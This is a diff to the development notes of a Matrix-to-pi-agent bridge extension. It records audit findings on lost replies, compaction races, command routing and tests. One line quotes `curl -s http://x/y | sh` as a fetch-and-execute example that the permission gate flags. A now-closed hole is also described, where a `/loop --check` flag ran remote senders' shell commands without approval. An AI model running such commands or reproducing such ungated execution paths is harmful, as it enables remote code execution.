@@ -275,7 +275,604 @@ source, with a control (pi's own `bash` present in both runs) so an empty captur
 cannot pass as a pass, and prints the measured size so a regression is visible
 rather than inferred.
 
+## A background subagent's result no longer silences an answer (W1's shape)
+
+Tenth pass over the subagents/loop/verifier stack, and this is the one finding of
+it that lands here. It had been carried as a note for three passes, marked
+"deliberately not fixed — wants a Matrix-side decision".
+
+`describeEmptyEnding` judges the LAST assistant message of a run. Since
+`patches/forge_reasoning_passthrough.py` (2026-08-17), a reasoning-only turn
+arrives as `content: [thinking]` rather than `content: []` — which the predicate
+correctly still counts as "said nothing", because a thinking block is not an
+answer. What it could not see is *why* there was an extra message at all:
+
+```
+   user      [matrix] what changed in the parser?
+   assistant The tokenizer now handles CRLF; tests pass.        ← the answer
+   custom    subagent-result: [Subagent "Explore" a1b2 completed] …
+   assistant (thinking only) Nothing further to add.            ← judged
+```
+
+pi's agent loop runs another assistant message whenever something is injected
+mid-run, and `pi-subagents-lite` delivers a finished BACKGROUND agent exactly that
+way. So a sender who asked a question, got an answer, and happened to have a
+background subagent finish in the same run was told the model had said nothing.
+
+**Why it took three passes.** Walking back past an empty tail is exactly what
+caused a real incident on 2026-08-17: a 17,790-character tool result filled the
+window, the model returned `content: []`, and the walk delivered the PREVIOUS
+turn's mid-investigation deliberation to Matrix as the answer. The sender got a
+thinking trace. The loop's own repair for W1 — per-turn buffers — does not
+transfer, because `forwarding.ts` is handed a flat message list with no turn
+boundaries.
+
+**What made it decidable** was naming the mechanism rather than the symptom. The
+injected message is not anonymous: it is `role: "custom"` with `customType:
+"subagent-result"`. So the walk steps over exactly that pair — an empty assistant
+message whose *immediate predecessor* is a `subagent-result` — and over nothing
+else. A `user` message still stops it, which is the sender's own question or an
+operator steer that changed the subject, and is precisely the boundary the
+incident bought. A `custom` message of any other type (a loop turn, a
+context-budget line) is not stepped over either, so nothing can become invisible
+by accident.
+
+`finalAssistantText` stops at the same place, and now breaks at a `user` message
+explicitly rather than relying on the empty-tail guard above it — otherwise the
+two functions could disagree about which run answered, silently.
+
+Five cases in `tests/forwarding.test.ts`, two of which fail without the fix;
+three are controls, and the incident's own shape is one of them. Full account in
+`context/design/subagents-loop-verifier-hosts.md` §9.7.
+
+## A message pi refused was dropped, and nobody was told (AB2)
+
+Eleventh pass, and the first defect found by reading this package's own host calls
+rather than by something else tripping over it. Ten passes had audited three of the
+five extensions in this stack; this is what the sweep found in the fourth.
+
+The call looks defended, and is not:
+
+```ts
+  try {
+    api.sendUserMessage(text, { deliverAs: settings.deliverAs });
+  } catch (err) {
+    log(…); notify('a Matrix message could not be delivered…', 'error');
+  }
+```
+
+`ExtensionAPI.sendUserMessage` returns **void**, and pi's binding is
+
+```js
+  sendUserMessage: (content, options) => {                 // agent-session.js:1855
+    this.sendUserMessage(content, options).catch((err) => {
+      runner.emitError({ extensionPath: "<runtime>", event: "send_user_message", … });
+    });
+  },
+```
+
+so every **asynchronous** failure is caught by pi. `emitError` walks
+`runner.errorListeners`, whose one possible member is registered at
+`agent-session.js:1809` and only when a UI bound one; and there is no error member
+of `ExtensionEvent` for an extension to subscribe to instead. The `catch` above
+can therefore see exactly one thing: a synchronous `runtime.assertActive()` throw
+from a stale runtime.
+
+`AgentSession.prompt()` throws for four reasons, three of which happen here:
+
+```
+   a compaction is in progress          agent-session.js:808
+   no model is selected                             :848
+   the provider has no usable auth                  :859   ← "llama-server is down"
+   streaming with no delivery mode                  :833   ← we always pass one
+```
+
+The first is reachable **every time `/loop` runs its compaction rung or its
+context recovery**: `ctx.compact()` reaches `AgentSession.compact()`, whose first
+statement is `await this.abort()` and which holds `_compactionAbortController` for
+the whole duration.
+
+**What it cost.** Silence, which is the worst outcome this extension has. The room
+went into `awaitingReply` on arrival, was never marked live because pi never
+consumed anything, and every later stage is gated on `live`: never answered, never
+retired, never reported, no typing indicator, no give-up message. From Matrix that
+is indistinguishable from being ignored — the exact failure the empty-turn
+continuation exists to prevent, one layer further out.
+
+**The fix reads the evidence this extension already collects.** `markLive` fires
+when pi echoes the message back as a `user` message, which is pi saying it has
+taken it. So an entry that is still not live **once the session is idle** and past
+a grace period was not taken. `src/delivery.ts` holds the rule and imports
+nothing; `sweepUndelivered()` runs it from `agent_settled` and from a 30-second
+unref'd interval — two triggers, because the failure removes the first one (a
+message that was refused never starts a run, so there may be no `agent_settled`).
+
+Idleness is the load-bearing half, not the clock. A message delivered while pi is
+streaming is queued and drains inside that same run, so it is live before
+`agent_settled`; waiting for idle removes the whole "it was just busy" class of
+false positives. The clock covers the one thing idleness cannot: `prompt()` awaits
+`_checkCompaction` *before* it starts a run, so a message handed to an idle
+session can sit with nothing running and nothing consumed for as long as an
+auto-compaction takes.
+
+Two choices worth stating:
+
+- **it reports and does not retire.** The entry stays, so a late delivery still
+  reaches `markLive` and the answer still goes out. The worst case of a wrong
+  verdict is one extra sentence; it can never be a lost answer.
+- **it does not re-send.** Asking the model the same question twice is worse than
+  saying "I could not hand that over".
+
+Full account in `context/design/subagents-loop-verifier-signals.md` (AB2),
+probe `context/testing/probes/o2-…`, hand-test `context/testing/subagents-loop-verifier.md` §O.
+
+### Two smaller things from the same sweep
+
+- **`prinny` must load BEFORE `rtk-pi`, and nothing said so.** Both register
+  `tool_call`; pi runs them in registration order; this one is the permission
+  relay and rtk's rewrites `event.input.command` in place. With prinny first, the
+  command a human is asked to approve is the command the model wrote, and a
+  blocked command never reaches rtk at all — `emitToolCall` returns immediately on
+  `{block:true}`. The other way round the relay would quote `rtk git status` for a
+  model that asked for `git status`. Now documented in `scripts/pi-local.sh`
+  beside the flag.
+- **`as Parameters<typeof api.sendUserMessage>[1]` was a cast onto itself.** The
+  ExtensionAPI type really does declare `{ deliverAs, expandPromptTemplates }`, so
+  the assertion could only ever have hidden a real signature change. Removed.
+
+## The delivery report about something that was never a delivery (AC4)
+
+Twelfth pass. AB2's sweep reads the absence of `markLive` as "pi never took this",
+which is sound for a message that was HANDED to pi. Two paths in `deliverInbound`
+never hand one over: a Matrix `/command` that is refused (the sender gets the
+refusal instead) and one that is allowed (pi dispatches it and returns before any
+turn, so there is no user message to echo). Both leave `live` false forever, both
+were past the grace on an idle session, and both were therefore reported a minute
+later as *"I could not hand that to the session … please send it again"* — about a
+message that had been answered, inviting a re-send of a command that would be
+refused again.
+
+`DeliveryEntry.answered` is the second question: was this ever pi's to take? The
+sweep asks it first, because it is the question that makes the other two
+meaningful.
+
+## A parcel accepted for an address that does not exist (AC5)
+
+Twelfth pass. `sendUserMessage` reaches `AgentSession.prompt()`, whose command
+branch is `_tryExecuteExtensionCommand` → `this._extensionRunner.getCommand(name)`
+— **extension** commands only. This stack registers four (`/stack`, `/loop`,
+`/agents`, `/prinny`). `/compact` is one of pi's BUILT-IN slash commands, and the
+only thing that executes one is the TUI's own input handler
+(`modes/interactive/interactive-mode.js`, the `text === "/compact"` branch).
+
+So `/compact` was on the allow-list, advertised in the client's `/` menu, and
+could not work: `prompt()` found no extension command, fell through, and delivered
+the literal text `/compact` to the model as a user turn — a whole model call on
+the one llama slot — while the sender was told "Ran `/compact`."
+
+The fix is a second table, `MATRIX_LOCAL`: commands this extension performs
+itself. The split is the durable part — an entry in `MATRIX_ALLOWED` is a promise
+**pi** keeps, an entry in `MATRIX_LOCAL` is a promise **this file** keeps, and
+putting a built-in in the wrong table is the mistake that was made.
+
+## The compaction that cancelled somebody else's turn (AD3)
+
+Thirteenth pass, and it is AC5's fix one layer out: the command was made real
+without asking what the call does.
+
+`ExtensionContext.compact` is `AgentSession.compact`, and that method's first
+statement is:
+
+```js
+   async compact(customInstructions) {
+       await this.abort();                      // agent-session.js:1367
+```
+
+So the first thing a remote `/compact` did was cancel whatever the session was
+doing — from a phone, with the command advertised in the client's own menu, in an
+extension whose every other inbound path is built specifically not to do that
+(inbound text is delivered `deliverAs: "followUp"` by default, under a comment
+reading *"a message arriving mid-turn joins the queue rather than interrupting
+work the user asked for in the terminal"*).
+
+The damage is not confined to a lost turn. `vendor/pi-loop-mode`'s `agent_end`
+ladder has a rung for an aborted turn and it PAUSES the run:
+
+```
+   Loop paused (turn aborted). Use /loop resume to continue.
+   Last notice: Turn aborted by operator.
+```
+
+An unattended run, stopped by a remote message, recorded against somebody who was
+not there. The loop's rung is correct — it exists for the operator's Esc — and it
+cannot tell the two apart, because both arrive as `stopReason: "aborted"`.
+
+`src/compaction-request.ts` is the fix: a pure
+`planCompaction({hasSession, agentRunning})` returning `now` / `defer` /
+`unavailable`, each with the sentence the sender gets. A request that lands
+mid-turn is held in `pendingCompaction` and drained in `agent_settled`, after
+`forwardResult()` — by then aborting costs nothing, and the sender's own answer is
+not queued behind a summariser call on the one slot.
+
+Deferred rather than refused: the sender asked for something reasonable, and
+usually asked because the bot had gone slow. The rule lives in `src/` for the
+reason `delivery.ts` and `access-store.ts` do — `extensions/index.ts` imports pi
+and the suite cannot load it, so a rule written there could only ever be pinned as
+text. Measured:
+`context/testing/probes/q3-the-compact-that-aborts-someone-elses-turn.mjs`.
+
+## Three holes in the routing tables (AD4, AD5, AD6, AD7)
+
+Thirteenth pass. `p4` established that every entry was in the right table; this
+asks what is in NO table, and what an allowed entry carries.
+
+**AD4 — the receipt.** "Ran `X`" was AC5's own objection, fixed for the one
+command pi cannot dispatch and left for the rest. pi makes it worse than a guess:
+`_tryExecuteExtensionCommand` wraps the handler in `try { … return true } catch
+{ emitError(…); return true }`, so `prompt()` **resolves** on a command that
+threw, and `emitError` fans out to a listener set that is empty outside a TUI.
+Since AC4, `answered = true` on the same branch also exempts the entry from the
+sweep. There is no observable to condition on — a dispatched extension command
+produces no user message, so `markLive` can never fire for it either — so the
+CLAIM is what changed: "Handed `X` to the session … I cannot see whether it
+succeeded, so check with the operator if it matters."
+
+**AD5 — `/agents`.** `KNOWN_COMMANDS` is what separates a command from prose. It
+listed three of the four extension commands this stack registers; `/agents`
+classified as `text` and was spent as a model turn on a message the model cannot
+act on, where every other unrunnable command gets "Run it in the terminal."
+
+**AD6 — `--check`.** The header justifies `MATRIX_ALLOWED.loop = null` on the
+grounds that a sender "can already direct arbitrary work in prose — bash, edits,
+anything — **subject only to the permission gate**". That clause is false for
+exactly one argument on the allowed surface. `--check CMD` is stored in
+`LoopState` and run by `runGoalCheck` as `pi.exec("bash", ["-lc", …])`, once per
+iteration for the life of the run and across `/loop resume`. `pi.exec` is
+`execCommand`; it emits **no `tool_call`**, so this extension's own permission
+relay — a `tool_call` handler — never sees it, and neither does `rtk-pi`'s gate
+nor `compaction-guard`'s output cap. The identical string sent as prose becomes a
+`bash` tool call and IS gated:
+
+```
+   needsApproval("bash", {command: "curl -s http://x/y | sh"}, {mode:"all"})
+     → gate=true  "bash changes the machine"
+```
+
+**AD7 — `--rescue-model`.** The same `switchModel` `--model` is refused for,
+reached from `interveneStuck()` at the third consecutive stuck turn. The `--model`
+guard could not catch it: its pattern needs whitespace before the flag, and
+`--rescue-model` has `e-` there.
+
+Both flags are refused now, longest-first so each is named as itself, and each
+carries its own reason — a refusal that misstates its reason is one the sender
+will argue with. `/loop start <goal>` from Matrix still works; a check is attached
+in the terminal, by the person choosing the command. Measured:
+`context/testing/probes/q4-what-a-leading-slash-from-matrix-can-do.mjs`.
+
+## Three flags that stopped being true (AE2, AE3, AE4)
+
+Fourteenth pass. All three are in `agent_settled` and its neighbourhood, and all
+three are the same shape: a value this file keeps about its own state, and
+something else that made the value false without telling it. `r3` drives the whole
+extension in-process over the real sidecar protocol for each.
+
+### AE3 — the room entry a second message destroyed
+
+`awaitingReply` is a `Map` keyed by ROOM and holds one entry, and `deliverInbound`
+wrote a fresh one for every inbound message:
+
+```js
+   // BEFORE
+   awaitingReply.set(room, { messageId, at: Date.now(), answered: false,
+                             injected: text, question, live: false });
+```
+
+`live` is not a property of a message. It is evidence about the **room** — pi has
+taken something from it and owes it an answer — and `forwardToMatrix` filters on
+it precisely so that an answer only ever goes to a room that is owed one.
+
+So a second message reset the evidence for the first. For two ordinary questions
+that self-corrects inside the same run: pi echoes the second, `markLive` fires
+again, and the answer goes out. For a message this extension answers **itself** it
+cannot, ever — a refused command, an allowed one and `/compact` all produce no
+user message, so `markLive` has nothing to match:
+
+```
+   $a1  "what is the status of the build?"  → handed to pi, echoed, LIVE
+   $a2  "/compact"                          → deferred (AD3), and the entry is
+                                              REPLACED: live=false, answered=true
+   …the model finishes answering $a1
+   agent_settled → forwardResult → forwardToMatrix(text)
+                 → rooms = live rooms = []  → return
+```
+
+The answer was discarded, and `answered: true` — set by the local branch on the
+way past — kept the undelivered sweep quiet about it too. One person, one room,
+two ordinary messages, and the reply to the first vanished with no trace on either
+side.
+
+`mergeAwaiting(previous, arrival)` in `src/delivery.ts` folds a new message into
+whatever the room already had, under two rules that are both "never throw evidence
+away": **`live` only ever goes up**, and **a message pi was never given does not
+become the room's marker, question or reply target.** `classifyMatrixCommand` now
+runs *above* the write, because the entry depends on its answer.
+
+### AE2 — the compaction that cancelled its own continuation
+
+AD3 deferred a mid-turn `/compact` to `agent_settled` on one premise, stated in
+`src/compaction-request.ts`: *"by then aborting costs nothing because the run is
+over."* True of the run that ended. The handler:
+
+```js
+   agentRunning = false;
+   stopTyping();
+   await forwardResult();       // ← the empty-turn continuation is sent from HERE
+   drainPendingCompaction();    // ← ctx.compact() → pi: `await this.abort()`
+```
+
+`src/continuation.ts` carries the same premise from the other side — *"a
+follow-up, not a steer: nothing is in flight at agent_settled"* — so two modules
+agreed about a moment and the first falsified it for the second.
+
+The two conditions arrive together rather than independently: a sender asks for a
+compaction *because* the bot has gone quiet, and an empty ending is what quiet
+looks like from inside — `describeEmptyEnding`'s `context` reason is a window at
+87% or more, which is the state a compaction is for.
+
+Both interleavings lose. If `prompt()` has reached `_runAgentPrompt` the abort
+kills the continuation; if it has not, `compact()` sets
+`_compactionAbortController` and `prompt()` either starts a run *during* a
+compaction or hits the `agent-session.js:808` throw — a rejection pi `.catch`es
+into `emitError`, which has no listeners headless.
+
+`forwardResult()` now returns whether it started a continuation, and
+`standAside(pending, started)` decides. Bounded by `COMPACTION_DEFER_LIMIT`, which
+is `MAX_EMPTY_RETRIES` read from the module that owns it, because a continuation
+that never starts (AE4, below) must not starve a request the sender was told would
+happen "as soon as it finishes".
+
+### AE4 — the continuation that was claimed, not evidenced
+
+```js
+   // BEFORE
+   retrying = true;
+   try { api.sendUserMessage(nudge, { deliverAs: 'followUp' }); }
+   catch (err) { retrying = false; }
+```
+
+The `catch` sees exactly one thing: a synchronous `assertActive()` throw on a
+stale runtime. Everything else — `prompt()` refusing during a compaction, no
+model, no provider auth, which here means the llama-server is down — rejects a
+promise **pi itself** `.catch`es into `emitError`. That is the fact `src/delivery.ts`
+was written around for the *inbound* direction; the retry is the same call, and
+was written as though it did not apply.
+
+`retrying` is what suppresses the retirement of every live room at the bottom of
+`forwardResult`. So a continuation that never happened left the sender's room
+`live: true, answered: false`, and **the next unrelated turn's answer was
+forwarded to it** — the operator's own answer, to a question typed in the
+terminal, sent to whoever had messaged. That is precisely the leak `markLive`
+exists to prevent, reached from the other side, and there is no window in which it
+self-corrects.
+
+The repair is not a better flag. Before the nudge is sent the room stands back
+**down** — `live = false`, `injected = nudge`, `at = now` — so:
+
+- pi takes it → echoes it → `markLive` matches the nudge → the room is answerable
+  again and the continuation's answer reaches it;
+- pi refuses it → the entry is not live, not answered and past the grace on an
+  idle session, which is exactly `undeliveredRooms`, and the sender is told the
+  one true thing.
+
+The failure stopped being invisible without anything new being built to see it.
+
+## The boundary one walk crossed and its sibling stopped at (AE7)
+
+`describeEmptyEnding` and `finalAssistantText` are a pair, and
+`finalAssistantText`'s header explains why it stops at a `user` message: a
+2026-08-17 incident in which walking past one delivered the previous turn's
+deliberation to Matrix as an answer. `describeEmptyEnding` did not stop there —
+its loop `continue`d past any non-assistant message — so a walk that had already
+stepped over an injected `subagent-result` pair could leave the run's own tail and
+find an answer from *before* the message being answered.
+
+```
+   assistant  "Here is the answer to what YOU asked in the terminal."
+   user       "[matrix] and what about the watermarking?"   ← drained as a
+   custom     subagent-result                                  follow-up, with a
+   assistant  [thinking]  — reasoning-only, since 2026-08-17    settled agent
+```
+
+`describeEmptyEnding` → `empty: false`; `finalAssistantText` → `""`. Nothing
+forwarded, no empty ending, no continuation, and the room retired: the sender got
+silence and no notice. The comment above the step-over says the boundary "is never
+crossed", and that was true of `finalAssistantText` and false of the function it
+was written in.
+
+The walk stops at a `user` message now, and reports `empty: true` when it has
+already passed an empty assistant tail. `sawEmptyTail` keeps it narrow — a run
+with no assistant message at all is still `empty: false`, which the suite pins.
+
+## The answer two rooms were both owed (AF1)
+
+Fifteenth pass. `forwardToMatrix` refuses to send when more than one room is
+live:
+
+```js
+   if (rooms.length > 1) {
+     log(`forward skipped (${why}): ${rooms.length} rooms are waiting and this text
+          cannot be attributed to one of them (${rooms.join(', ')})`);
+     return;
+   }
+```
+
+That is right, and it is the only right answer: with two live rooms there is no
+way to tell whose answer this is, and sending one person's conversation to
+another is not undoable. The question this pass asks is the next one — what
+happens to the answer it declined to send, and to the two questions still waiting
+for it — and it is answered eight lines further down the same handler:
+
+```js
+   if (!retrying) {
+     for (const [room, entry] of awaitingReply) {
+       if (entry.live) awaitingReply.delete(room);
+     }
+   }
+```
+
+Both rooms are retired. The entries that proved either question had ever been
+asked go with them, which is also why `sweepUndelivered` could not report it:
+`undeliveredRooms` reads a map that no longer contains them. **Two people, two
+questions, zero answers, zero notices, and one line in `channel.log`.**
+
+**It is the ordinary case for a channel with two people on it.** One in a DM and
+one in a room is enough. `deliverInbound` hands each message over as a follow-up,
+and pi's agent loop drains the follow-up queue INSIDE the same run
+(`pi-agent-core/dist/agent-loop.js:162`), so both are echoed back as user
+messages, `markLive` marks both, one answer arrives, and it belongs to one of
+them.
+
+The fourteenth pass looked straight at this behaviour: `r3`'s header explains
+that a leftover live room from an earlier scenario suppresses the leak the next
+scenario is about, which is why its four modes run one to a process. True, same
+mechanism, read as a fact about the probe.
+
+**The fix is not a change to the refusal.** `forwardToMatrix` records that it
+could not attribute the answer, and the retirement — before it deletes anything —
+tells every live room that has had nothing sent for it:
+
+```
+   unansweredRooms(entries)               live && !answered     src/delivery.ts
+   unansweredMessage('ambiguous')         "Someone else was being answered in the
+                                           same turn and I could not tell which
+                                           reply was yours, so I sent nothing
+                                           rather than send you theirs. Please
+                                           ask again."
+   unansweredMessage('nothing-to-send')   "That turn finished without anything I
+                                           could send you. Nothing is waiting on
+                                           my side; please ask again."
+```
+
+and the operator gets a `notify`, not just a `log`. The `ambiguous` sentence says
+that somebody else was being answered — it is the one thing that explains the
+silence, it names nobody, and without it the message reads as a malfunction
+rather than as the deliberate refusal it is.
+
+Two smaller repairs fall out of the same rule, both making `answered` mean what
+it says:
+
+- the give-up message sent when the empty-turn retries are spent now marks the
+  entry, because it IS something sent for that message — and without it the
+  retirement would put a second sentence on top of it;
+- the `forward: "off"` branch, which used to `notify` the operator and tell the
+  sender nothing, now goes through the same path.
+
+The two sweeps together now cover the whole map, and the row AF1 fills is the one
+where pi definitely took the message:
+
+```
+   live?    answered?    who reports it
+   ─────────────────────────────────────────────────────────────
+   false    false        the SWEEP, after the grace            AB2
+   false    true         nobody — this extension answered it   AC4
+   true     true         nobody — the answer went out
+   true     false        the RETIREMENT, now                 ← AF1
+```
+
+Measured: `context/testing/probes/s1-the-answer-two-rooms-were-both-owed.mjs`.
+See AF1 in `context/design/subagents-loop-verifier-omissions.md`.
+
+## The compaction somebody else was already running (§11.12, closed)
+
+Fifteenth pass. AD3 made a Matrix `/compact` wait for `agent_settled` on the
+grounds that "by then aborting costs nothing because the run is over"; AE2 found
+the run this handler starts itself one line earlier. This is the third thing in
+that moment: `vendor/pi-loop-mode`'s `agent_settled` handler runs BEFORE this one
+and may already have asked for an emergency compaction — and pi's `compact()`
+does not refuse a second call, it aborts and proceeds.
+
+The fix is a lock neither package owns, over one `globalThis` key, with a copy in
+each package and a test in each that imports the other and asserts they agree.
+This side's answer to a refusal is a sentence rather than a queue:
+
+> A compaction is already running — I will let that one finish rather than cutting
+> it off.
+
+which is the honest one: the sender asked for the context to be compacted, and it
+is being compacted. A second request moments after the first earns only pi's own
+"Already compacted", so there is nothing to hold. Note what it does NOT say — it
+is not the `Compacted the conversation context.` reply, because that one is sent
+from `onComplete` and this compaction is not ours to report on.
+
+Measured: `context/testing/probes/s5-two-extensions-one-compaction.mjs`. See §10.6
+of `context/design/subagents-loop-verifier-omissions.md`.
+
+## The continuation and the compaction already running (AG3)
+
+Sixteenth pass, and it is AE2's collision with the two parties swapped.
+
+AD3 deferred a Matrix `/compact` to `agent_settled` on one sentence — *"by then
+aborting costs nothing because the run is over"* — which is true of the run that
+just ended and false of the one the same handler starts one line earlier. AE2
+made the compaction stand aside for that continuation. **Nothing made the
+continuation stand aside for a compaction**, and the one it collides with is not
+prinny's own:
+
+```
+   agent_settled
+     ├─ pi-loop-mode   runs FIRST  → requestEmergencyCompaction → ctx.compact()
+     └─ prinny-channel runs SECOND → forwardResult() → the run ended empty →
+                                     api.sendUserMessage(nudge)
+```
+
+pi's refusal for that is on `AgentSession.prompt()`, which `sendUserMessage`
+reaches, and it is a THROW into a promise pi `.catch`es into `emitError` — an
+empty listener set outside a TUI. So the nudge went nowhere, silently, while
+`entry.emptyRetries` was charged for it and one of the message's two rescue
+attempts was spent on a send that never happened.
+
+**The two conditions are correlated rather than independent**, which is what makes
+this the ordinary case rather than a race. The loop's starvation rung fires on a
+clean `stop` with no answer at ≥80% of the window; `describeEmptyEnding`'s
+`context` reason is ≥87%. **One empty turn on a saturated context produces both**,
+and that is exactly the moment a Matrix sender is waiting through.
+
+`startCompaction`, twelve lines up in the same file, has read
+`compactionInFlight()` since §11.12 landed. This was the other sender.
+
+**Held and reported, not deferred.** `heldForCompaction` is deliberately not
+`retrying`: that one is returned as `continuationStarted` and decides whether a
+waiting `/compact` stands aside (AE2), and nothing started here. The room is
+**retired with a sentence** rather than left live, and that is the load-bearing
+half — an entry that is live and unanswered is invisible to `undeliveredRooms`,
+so leaving it would have traded a wasted retry for silence.
+
+The sentence is AF1's own retirement notice with a third `UnansweredReason`:
+
+```
+   ambiguous        two live rooms, so forwardToMatrix could not attribute it
+   compacting       the run ended empty and the session was already compacting
+   nothing-to-send  everything else
+```
+
+`unansweredMessage("compacting")` says the true reason NOW, where the delivery
+sweep a minute later can only hedge — *"it MAY have been compacting"* — because
+the sweep has no observable and this branch has the lock in hand.
+
+```
+   t1, both shipped extensions in one process:
+                                                 BEFORE    NOW
+     continuation nudges sent                  :  1         0
+     …that pi would have TAKEN                 :  0         0
+     retries charged to the sender's message   :  1         0
+     what the sender was told, and when        :  nothing;  immediately, and
+                                                  the sweep  the true reason
+                                                  60 s later,
+                                                  guessing
+```
+
 ## Two known hazards
+
 
 - **One channel per machine, one account per channel.** Two bots signed into the
   same Matrix account duplicate every delivery and fight over the crypto store,
@@ -296,7 +893,15 @@ node vendor/prinny-channel/server/bin/prinny-channel.mjs --prepare   # once, ~1 
 node --experimental-strip-types --test tests/*.test.ts
 ```
 
-231 tests, no `node_modules`, three layers:
+**382 tests, up from 377**, no `node_modules`, three layers:
+
+The five added in the sixteenth pass are the AG3 block in `tests/delivery.test.ts`
+(**3 fail** with the guard, the reason and the lock read reverted together; **1**
+with only the guard). Four of the five are wiring pins on `extensions/index.ts`,
+which imports pi and cannot be loaded by the suite — the ORDER matters and is what
+they pin: the lock is read before the nudge, and the guard sits outside the block
+that spends a retry. The fifth is the sentence, and it asserts that it does NOT
+hedge the way the delivery sweep's has to.
 
 - **Upstream's suite** (access, queue, inbox, mentions, permissions, history,
   stdout guard) ported from vitest onto `node:test` via `tests/harness.ts`, and
@@ -313,6 +918,43 @@ node --experimental-strip-types --test tests/*.test.ts
   needing a homeserver. This is what catches a wrong notification method name,
   which otherwise fails as "messages never arrive" and nothing else.
 
+The fifteenth pass also adds `tests/compaction-lock.test.ts` (11) for §11.12 —
+the protocol, the staleness bound, and three cases that import
+`pi-loop-mode`'s copy to assert the two agree and interlock — with wiring pins
+that the holder is read BEFORE `uiCtx.compact` is called and that the
+stand-aside reply is not the completion reply.
+
+The fifteenth pass adds a four-case `unansweredRooms` / `unansweredMessage`
+suite and a five-case wiring pin to `tests/delivery.test.ts` (AF1). The wiring
+pins are what the pure functions cannot cover: that the rooms are told BEFORE the
+retirement deletes them, that the give-up path marks `answered` so a room cannot
+be told twice, and that the ambiguity flag is set where the refusal happens and
+cleared at the end of the run it belongs to.
+
+The fourteenth pass adds a nine-case `mergeAwaiting` suite and a four-case AE4
+suite to `tests/delivery.test.ts` (1 and 3 fail respectively with their fixes
+reverted), a six-case `standAside` suite plus a three-case wiring pin to
+`tests/compaction-request.test.ts` (1 fails), and three AE7 cases to
+`tests/forwarding.test.ts` (1 fails). One of the `standAside` cases asserts that
+`COMPACTION_DEFER_LIMIT` equals `MAX_EMPTY_RETRIES` by reading the latter out of
+`src/continuation.ts` — the bound stands aside for exactly one mechanism, so it is
+that mechanism's budget rather than a second constant that can drift.
+
+The executions are `context/testing/probes/r3-…`, which drives this whole
+extension in-process over the real MCP sidecar protocol using
+`context/testing/probes/_sidecar.mjs` — a stand-in the PROBE can drive, taking its
+inbound messages from a file and recording every `tools/call` to another.
+`tests/fixtures/fake-sidecar.mjs` is unchanged and still right for this suite; it
+sends one message at a moment it chooses and discards its tool calls, which is why
+none of AE2, AE3 or AE4 could have been executed against the real extension
+before.
+
+The thirteenth pass adds `tests/compaction-request.test.ts` (9 — five behavioural
+cases on `planCompaction` and four source pins on the wiring `extensions/index.ts`
+needs, which the suite cannot load) and a six-case `thirteenth pass` suite in
+`tests/command-routing.test.ts`, with controls for `/loop start` without flags and
+for `--checkout`, which is prose.
+
 Two findings worth keeping:
 
 - `constructor(private readonly x: T)` is TypeScript that emits code, and Node's
@@ -320,3 +962,34 @@ Two findings worth keeping:
   under pi and failed only under `node --test`.
 - Node does **not** rewrite a `.js` specifier to `.ts`, so the sidecar's sources
   cannot be imported directly — checked with a control, not assumed.
+
+## Seventeenth pass — no findings, and one change to the protocol around it
+
+**No AH finding is in this package**, and 382 tests are unchanged. Two things
+about it are worth recording anyway, because both are about code here that other
+packages now depend on.
+
+**The compaction lock has a THIRD implementation.**
+`vendor/pi-subagents-lite/src/spawn/compaction-lock.ts` joined this file's copy
+and `pi-loop-mode`'s, because `SpawnCoordinator.emitIndividualNudge` turned out
+to be the third sender through `sendCustomMessage`'s `triggerTurn` branch — the
+one AG3 is about, from the other side. The third copy is **read-only**: nothing
+in that package calls `ctx.compact()`, so it exports `compactionInFlight`,
+`COMPACTION_LOCK_KEY` and `STALE_MS` and not `begin`/`end`. `src/compaction-lock.ts`
+here is unchanged, and `tests/compaction-lock.test.ts` is unchanged; the new
+package's own suite imports this one's source and asserts the key and the bound
+agree, which is the same arrangement in one more direction.
+
+**This package's `forwardResult` is the model the third sender did NOT copy, and
+the difference is the interesting part.** AG3 makes prinny *hold and report*:
+the continuation is not sent, no retry is charged, and the room is retired with
+the `compacting` reason so the sender is told the true thing NOW rather than
+being told a hedge by the delivery sweep a minute later. AH1 makes the
+coordinator *defer*: the nudge is re-asked every five seconds until the lock
+frees. Both are correct and the reason they differ is what each one is holding.
+prinny is holding one of two rescue attempts at an answer, and there is a PERSON
+who can be asked again; the coordinator is holding a finished delegation's only
+answer, from a record whose slot is released and whose completion gate is open,
+and there is nobody to ask. **The right behaviour on a refusal is a property of
+what you are holding, not of the refusal.** That is §10.3 of the write-up, and it
+is why AH1 is not simply "do what AG3 did".
